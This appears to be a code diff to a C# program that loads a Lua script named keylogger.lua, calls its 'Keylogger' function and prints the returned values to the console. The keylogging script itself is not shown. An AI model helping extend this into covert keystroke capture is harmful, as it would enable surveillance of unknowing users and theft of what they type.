@@ -16,12 +16,17 @@ public class Program
             {
                 // Executa o script Lua
                 lua.DoFile("scripts\\keylogger.lua");
-                LuaFunction test = lua["test"] as LuaFunction;
+                LuaFunction keylogger = lua["Keylogger"] as LuaFunction;
                 // Recupera o resultado da execução do script Lua
-                object[] result = test.Call();
+                object[] result = keylogger.Call();
 
-                // Exibe o resultado
-                Console.WriteLine("Resultado do Lua: " + result[0]);
+                LuaTable resultTable = result[0] as LuaTable;
+
+                foreach(var key in resultTable.Values)
+                {
+                    Console.WriteLine(key);
+                }
+
             }
             catch (Exception ex)
             {
